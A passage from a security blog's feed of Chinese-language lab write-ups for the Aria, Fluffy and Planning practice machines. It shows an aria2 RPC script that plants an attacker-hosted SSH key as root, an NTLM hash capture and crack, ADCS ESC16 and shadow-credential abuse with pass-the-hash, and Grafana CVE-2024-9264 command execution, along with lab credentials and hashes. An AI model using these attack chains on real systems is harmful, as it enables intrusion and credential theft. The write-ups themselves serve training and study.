`token: maze-sec`\n\n### Aria2 PRC - 2\n\n在文档中能看到上传的了例子，我们让 AI 进行修改一下，上传公钥文件\n\n```bash\n#!/usr/bin/python2\n# -*- coding: utf-8 -*-\n\nimport urllib2\nimport json\n\n# 1. Your attacker machine's IP address and web server port\nattacker_ip = \"192.168.56.5\" \nattacker_port = 8080\n\n# 2. The URL to your malicious authorized_keys file\npayload_url = \"http://{}:{}/authorized_keys\".format(attacker_ip, attacker_port)\n\n# 3. The secret token for the aria2 RPC interface\nrpc_token = \"maze-sec\"\n\n# 4. Build the aria2 JSON-RPC request\njsonreq = json.dumps({\n    'jsonrpc': '2.0',\n    'id': 'qwer',\n    'method': 'aria2.addUri',\n    'params': [\n        \"token:{}\".format(rpc_token),  # <-- THIS IS THE CRUCIAL ADDITION\n        [payload_url],                 # The URL list is now the second parameter\n        {                              # The options object is now the third\n            'dir': '/root/.ssh',\n            'out': 'authorized_keys'\n        }\n    ]\n})\n\nprint \"Sending payload with token to aria2...\"\n\n# 5. Send the request\ntry:\n    c = urllib2.urlopen('http://192.168.56.116:6801/jsonrpc', jsonreq)\n    print \"Payload sent successfully!\"\n    print \"Server response:\", c.read()\n    print \"\\nCheck your web server logs to see if the file was downloaded.\"\n    print \"If successful, you should now be able to SSH as root.\"\nexcept urllib2.HTTPError as e:\n    print \"HTTP Error:\", e.code\n    print \"Response body:\", e.read()\nexcept Exception as e:\n    print \"An error occurred:\", e\n```\n\n修改脚本后运行脚本，上传成功\n\n![image.png](/post-images/HackMyVMAria/image7.png)\n\n通过私钥进行登录，成功登录\n\n![image.png](/post-images/HackMyVMAria/image8.png)\n\n读取 `root.txt`\n\n```bash\nroot@Aria:~# cat root.txt \nflag{root-374495cbd5d79b6e45b7778cbac070cc}\n```\n\n## 总结\n\nMedium ？",
            "url": "https://www.sunsetaction.top/2025/09/23/HackMyVMAria",
            "title": "HackMyVM - Aria",
            "summary": "Aria. https://hackmyvm.eu/machines/machine.php?vm=Aria Recon 端口扫描 80 端口 给出了一点信息 通过 md5(time()·rand(1,1000)) 生成不可预测的文件名 并且文件内容不可包含 <?php 以及文件名仅仅可以是 gif...",
            "date_modified": "2025-09-23T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HMV",
                "Aria2",
                "Zero-Width",
                "Space",
                "Steganography",
                "Brute"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy",
            "content_html": "\n# Season8 - Fluffy\n\n> https://app.hackthebox.com/machines/Fluffy | `Windows` · `Easy`\n> \n\n**Machine Information：**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!\n\n## 前期踩点\n\n```bash\n➜ nmap -sT -min-rate 5000 -p- 10.10.11.69       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT\nNmap scan report for 10.10.11.69\nHost is up (0.15s latency).\nNot shown: 65524 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49667/tcp open  unknown\n49677/tcp open  unknown\n49695/tcp open  unknown\n49701/tcp open  unknown\n```\n\n这次的靶机依旧是没有`Web` \n\n```bash\n➜ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT\nNmap scan report for 10.10.11.69\nHost is up (0.16s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-05-25T11:38:32\n|_  start_date: N/A\n|_clock-skew: 6h38m59s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   183.42 ms 10.10.16.1\n2   183.81 ms 10.10.11.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 63.00 seconds\n\n```\n\n## 信息收集\n\n### SMB\n\n测试凭据\n\n```bash\n➜ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n```\n\n枚举用户\n\n```bash\n➜  nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute | grep \"SidTypeUser\" | awk -F '\\\\' '{print $2}' | awk '{print $1}' \nGuest\nkrbtgt\nDC01$\nca_svc\nldap_svc\np.agila\nwinrm_svc\nj.coffey\nj.fleischman\n```\n\n`SMB` 信息收集\n\n```bash\n➜ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk      \n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n```bash\n➜ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sun May 25 08:21:54 2025\n  ..                                  D        0  Sun May 25 08:21:54 2025\n  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025\n  1.lnk                               A     2164  Sun May 25 07:59:46 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025\n  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025\n  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025\n\n                5842943 blocks of size 4096. 1849449 blocks available\n```\n\n `Upgrade_Notice.pdf` 像是渗透测试报告一样的东西\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png)\n\n下边有披露的公开漏洞\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png)\n\n能看到有两个 `Critical` 漏洞以及两个 `High` 漏洞\n\n### CVE-2025-24071\n\n对比了两个漏洞 `CVE-2025-24996` 和 `CVE-2025-24071`\n\n其中 `CVE-2025-24996` 网上文章并不多，而 `CVE-2025-24071` 会有复现文章，所以侧重于 `CVE-2025-24071`\n\n复现文章：https://blog.csdn.net/weixin_42773448/article/details/146436061\n\n工具：https://github.com/0x6rss/CVE-2025-24071_PoC\n\n```bash\n➜  CVE-2025-24071_PoC git:(main) python poc.py \nEnter your file name: doc\nEnter IP (EX: 192.168.1.162): 10.10.16.16\ncompleted\n```\n\n上传到 `IT`\n\n```bash\nsmb: \\> put exploit.zip\nputting file exploit.zip as \\exploit.zip (0.8 kb/s) (average 0.8 kb/s)\n```\n\n同时开启`responder`监听\n\n```bash\n➜ responder -I tun0 -wd\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.5.0\n\n  To support this project:\n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n```\n\n等一会能就接收到 `p.agila` 用户 `NET NTLM hash`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png)\n\n```bash\np.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  \n```\n\n使用 `hashcat` 进行破解用户凭据\n\n```bash\n➜ hashcat -m 5600 'xxxx' /usr/share/wordlists/rockyou.txt \n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png)\n\n得到密码 `prometheusx-303` \n\n测试凭据\n\n```bash\n➜ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n```\n\n### BloodHound\n\n这里使用 `BloodHound` 进行枚举域攻击路线\n\n```bash\nntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb\n```\n\n```bash\n➜ ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb\nINFO: Found AD domain: fluffy.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.fluffy.htb\nINFO: Done in 00M 24S\nINFO: Compressing output into 20250525091352_bloodhound.zip\n```\n\n用户 `p.agila` 属于 `SERVICE ACCOUNT MANGERS` 和 `SERVICE ACCOUNTS` 组，其中`SERVICE ACCOUNT MANGERS` 对 `SERVICE ACCOUNTS` 组有 `GenericAll` 权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png)\n\n然后远程服务用户 `WINRM_SVC` 等也是在 `SERVICE ACCOUNTS` 组内\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png)\n\n## 域渗透\n\n### To Winrm_svc\n\n可以使用 `GetUserSPNs` 获取服务用户 `HASH` 来进行破解\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png)\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png)\n\n但是并无法破解成功，服务账户密码都是随机的…\n\n影子用户(`Shadow Credential Attack`)启动\n\n```bash\n➜ certipy shadow auto -username \"p.agila@fluffy.htb\" -p \"prometheusx-303\" -account WINRM_SVC -dc-ip 10.10.11.69\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png)\n\n```bash\n➜ export KRB5CCNAME=winrm_svc.ccache \n```\n\n`evil-winrm` 登录\n\n```bash\n➜ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents> \n```\n\n`user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop> type user.txt\n9e23a6ed83a674306f7fad569aa292bb\n```\n\n### 寻找攻击路线\n\n继续寻找提权路线\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png)\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png)\n\n感觉还是要拿 `CA_SVC` 用户进行一些攻击，例如 `ADCS` 攻击，因为它是 `CA` 服务用户\n\n使用 `certipy` （这里需要对`certipy`进行更新，在这里卡了很久，愣是找不到攻击路径）枚举可能的漏洞信息\n\n```bash\n➜ certipy find -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable     \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 14 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP\n[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'\n[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Saving text output to '20250525110326_Certipy.txt'\n[*] Wrote text output to '20250525110326_Certipy.txt'\n[*] Saving JSON output to '20250525110326_Certipy.json'\n[*] Wrote JSON output to '20250525110326_Certipy.json'\n\n```\n\n存在 `ESC16`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png)\n\n### ESC16\n\n利用链接：https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\n\n影子用户获取 `CA_SVC` 的 `NT hash` \n\n```bash\n➜ certipy shadow auto -username \"p.agila@fluffy.htb\" -p \"prometheusx-303\" -account CA_SVC -dc-ip 10.10.11.69\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'ca_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID '7f0851e9-35c3-eccb-fd92-b35465aa5f94'\n[*] Adding Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'\n[*] Successfully added Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'\n[*] Authenticating as 'ca_svc' with the certificate\n[*] Using principal: ca_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'ca_svc.ccache'\n[*] Trying to retrieve NT hash for 'ca_svc'\n[*] Restoring the old Key Credentials for 'ca_svc'\n[*] Successfully restored the old Key Credentials for 'ca_svc'\n[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8\n```\n\n下面跟着利用链接的做即可\n\n```bash\n➜ certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read\n\n[*] Reading attributes for 'ca_svc':\n    cn                                  : certificate authority service\n    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\n    name                                : certificate authority service\n    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103\n    sAMAccountName                      : ca_svc\n    servicePrincipalName                : ADCS/ca.fluffy.htb\n    userPrincipalName                   : ca_svc@fluffy.htb\n    userAccountControl                  : 66048\n    whenCreated                         : 2025-04-17T16:07:50+00:00\n    whenChanged                         : 2025-05-25T14:57:02+00:00\n```\n\n```bash\n➜ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : administrator@fluffy.htb\n[*] Successfully updated 'ca_svc'\n\n```\n\n```bash\n➜ certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'\n\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 43\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@fluffy.htb'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\n```bash\n➜ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated 'ca_svc'\n```\n\n```bash\n➜ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69                                                                                                   \nCertipy v5.0.2 - by Oliver Lyak (ly4k)      \n                                                                                                                                                                                                                  \n[*] Certificate identities:                                                                                                                                                                                       \n[*]     SAN UPN: 'administrator@fluffy.htb'                                                              \n[*] Using principal: 'administrator@fluffy.htb'                                                                                                                                                                   \n[*] Trying to get TGT...                                                                                                                                                                                          \n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache' \n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n```\n\n```bash\n➜ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.11.69.....\n[*] Found writable share ADMIN$\n[*] Uploading file VJlmOeTb.exe\n[*] Opening SVCManager on 10.10.11.69.....\n[*] Creating service trya on 10.10.11.69.....\n[*] Starting service trya.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.6893]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n\n```\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n03337de6b0f0f5188a76c3970006b97b\n```\n\n## 总结\n\nCVE-2025-24071，ADCS，ESC16，NTLM 中继",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy",
            "title": "HackTheBox - Machine - Fluffy",
            "summary": "Season8 Fluffy https://app.hackthebox.com/machines/Fluffy | Windows · Easy Machine Information：As is common in real life Windows pentests, you will st...",
            "date_modified": "2025-05-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Windows",
                "ADCS",
                "ESC16",
                "Responder"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning",
            "content_html": "\n# Machine - Planning\n\n> https://app.hackthebox.com/machines/Planning | `Esay`\n> \n\n## 前期踩点\n\n```bash\n➜  Planning nmap -sT -min-rate 10000 -p- 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:56 EDT\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (0.19s latency).\nNot shown: 65269 filtered tcp ports (no-response), 264 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 50.82 seconds\n```\n\n```bash\n➜  Planning nmap -sU -min-rate 5000 -p- 10.10.11.68                                                                                                                                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 01:01 EDT\nWarning: 10.10.11.68 giving up on port because retransmission cap hit (10).\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (4.5s latency).\nAll 65535 scanned ports on planning.htb (10.10.11.68) are in ignored states.\nNot shown: 65443 open|filtered udp ports (no-response), 92 closed udp ports (port-unreach)\n\nNmap done: 1 IP address (1 host up) scanned in 176.18 seconds\n```\n\n```bash\n➜  Planning nmap -sT -A -T4 -O -p 22,80 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:59 EDT\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (0.21s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)\n|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-server-header: nginx/1.24.0 (Ubuntu)\n|_http-title: Edukate - Online Education Website\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   221.80 ms 10.10.16.1\n2   161.43 ms planning.htb (10.10.11.68)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.81 seconds\n```\n\n收集到一个邮箱 `info@planning.htb`\n\n```bash\n➜  Planning whatweb planning.htb\nhttp://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]\n```\n\n## Web 渗透\n\n### 信息收集\n\n访问 `HTTP` 服务，采集指纹\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image.png)\n\n可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Haks`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image1.png)\n\n`Detail.php` 页面可以注册，但是貌似没什么用\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image2.png)\n\n目录扫描\n\n```bash\n➜  Planning dirsearch -u http://planning.htb -x 404,429 -e php,zip,txt \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Planning/reports/http_planning.htb/_25-05-11_01-14-34.txt\n\nTarget: http://planning.htb/\n\n[01:14:34] Starting: \n[01:14:51] 200 -   12KB - /about.php\n[01:15:12] 200 -   10KB - /contact.php\n[01:15:13] 301 -  178B  - /css  ->  http://planning.htb/css/\n[01:15:24] 301 -  178B  - /img  ->  http://planning.htb/img/\n[01:15:27] 301 -  178B  - /js  ->  http://planning.htb/js/\n[01:15:27] 403 -  564B  - /js/\n[01:15:29] 301 -  178B  - /lib  ->  http://planning.htb/lib/\n[01:15:29] 403 -  564B  - /lib/\n```\n\n爆破一下子域名\n\n```bash\n➜  Planning wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H 'Host:FUZZ.planning.htb'                                                                               \n********************************************************                                                                                                                                                                            \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                                            \n********************************************************                                                                                                                                                                            \n                                                                                                                                                                                                                                    \nTarget: http://planning.htb/                                                                                                                                                                                                        \nTotal requests: 100000                                                                                                                                                                                                              \n                                                                                                                                                                                                                                    \n=====================================================================                                                                                                                                                               \nID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     \n=====================================================================    \n000024093:   302        2 L      2 W        29 Ch       \"grafana\"    \n```\n\n能找到叫 `grafana` 的子域名，添加到 `hosts` 文件\n\n访问一下，版本是 `Grafana v11.0.0 (83b9528bce)`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image3.png)\n\n### Grafana\n\n> Grafana 是一个开源的度量分析和可视化工具，支持多种数据源如 Graphite、InfluxDB 等。安装完成后，Grafana 的默认用户名和密码都是***admin***\n> \n\n尝试下默认密码，是失败的\n\n找一下版本相关漏洞\n\n1. https://github.com/nollium/CVE-2024-9264 可以进行 LFI 和 RCE ，但是要验证后\n2. https://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/ XSS 漏洞\n\n然后发现：\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image4.png)\n\n```bash\nAs is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r\n```\n\n得到密码 `admin`/`0D5oT70Fq13EvB5r`\n\n尝试利用 `CVE-2024-9264`\n\n```bash\n(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb\n```\n\n成功利用\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image5.png)\n\n```bash\n(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb\n[+] Logged in as admin:0D5oT70Fq13EvB5r\n[+] Executing command: whoami\n[+] Successfully ran duckdb query:\n[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):\n[+] Successfully ran duckdb query:\n[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):\nroot\n```\n\n我们在 Docker 环境中\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image6.png)\n\n进行反弹 `shell`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image7.png)\n\n## Docker 逃逸\n\n反弹 `shell` 后对 `shell` 进行优化 ：https://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\n\n在 `env` 命令输出中，能找到 \n\n```bash\nroot@7ce659d667d7:~# env    \n...      \nGF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!\nGF_SECURITY_ADMIN_USER=enzo\n...\n```\n\n尝试用改凭据进行 SSH 登录\n\n```bash\n➜  Planning ssh enzo@planning.htb \nenzo@planning.htb's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun May 11 06:26:45 AM UTC 2025\n\n  System load:           0.13\n  Usage of /:            77.6% of 6.30GB\n  Memory usage:          43%\n  Swap usage:            16%\n  Processes:             294\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.68\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:4d58\n\n  => There are 43 zombie processes.\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\n1 additional security update can be applied with ESM Apps.\nLearn more about enabling ESM Apps service at https://ubuntu.com/esm\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun May 11 06:27:42 2025 from 10.10.16.12\nenzo@planning:~$ \n```\n\n成功进入…\n\n## 提权 - To Root\n\n### 信息收集\n\n在当前目录下可以找到 `user.txt`\n\n```bash\nenzo@planning:~$ cat user.txt \n97cbc3d1ee1c848ab5255a90dc366206\n```\n\n上传 `Linpeas` 收集信息\n\n```bash\n╔══════════╣ SUID - Check easy privesc, exploits and write perms\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid\n-rwsr-xr-x 1 root root 19K Dec  2 11:59 /usr/lib/polkit-1/polkit-agent-helper-1\n-rwsr-xr-x 1 root root 335K Apr 22 11:51 